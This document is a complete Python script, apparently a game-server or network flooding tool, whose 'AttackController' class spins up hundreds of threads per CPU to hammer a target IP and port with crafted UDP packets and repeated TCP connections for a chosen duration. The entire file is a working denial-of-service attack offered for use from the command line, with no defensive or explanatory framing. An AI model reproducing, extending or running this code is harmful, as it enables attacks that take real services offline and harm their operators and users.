import argparse
import os
import random
import socket
import sys
import threading
import time
from contextlib import suppress

class AttackController:
    def __init__(self):
        self.udp_event = threading.Event()
        self.tcp_event = threading.Event()
        self.start_event = threading.Event()
        self.cpu_count = os.cpu_count() or 1

    def create_udp_socket(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                sock.bind(('', random.randint(32768, 65535)))
                return sock
            except OSError:
                continue

    def create_tcp_socket(self, ip, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(0.9)
        while True:
            try:
                sock.bind(('', random.randint(32768, 65535)))
                sock.connect((ip, port))
                return sock
            except Exception:
                continue

    def udp_flood(self, ip, port):
        sock = self.create_udp_socket()
        self.start_event.wait()
        while not self.udp_event.is_set():
            payload = b"\x01\x71" + os.urandom(12) + b"\x2e\x61\x62\x6f\x6d\x20\x54\x53\x45\x62\x20\x45\x48\x74\x2e\x53\x44\x4e\x45\x47\x45\x6c\x20\x45\x4c\x49\x42\x4f\x6d\x01"
            sock.sendto(payload, (ip, port))

    def tcp_flood(self, ip, port):
        self.start_event.wait()
        while not self.tcp_event.is_set():
            with suppress(Exception), self.create_tcp_socket(ip, port) as sock:
                while not self.tcp_event.is_set():
                    payload = b"\x00\x00\x00\x17\x70\x00\xf5\x07\x01" + os.urandom(2) + b"\x45\x07\x70\x00" + os.urandom(4) + b"\x80\x06\x01\x80"
                    sock.send(payload)

    def start_attack(self, ip, port, duration):
        threads = self.cpu_count * 200
        print(f"[+] Starting attack with {threads} threads per vector")
        
        for _ in range(threads):
            threading.Thread(target=self.udp_flood, args=(ip, port), daemon=True).start()
            threading.Thread(target=self.tcp_flood, args=(ip, port), daemon=True).start()
        
        self.start_event.set()
        time.sleep(duration)
        
        print("[!] Stopping attack...")
        self.udp_event.set()
        self.tcp_event.set()

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <IP> <PORT> <TIME>")
        sys.exit(1)
    
    controller = AttackController()
    try:
        controller.start_attack(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
    except KeyboardInterrupt:
        controller.udp_event.set()
        controller.tcp_event.set()
        print("\n[!] Attack stopped by user")
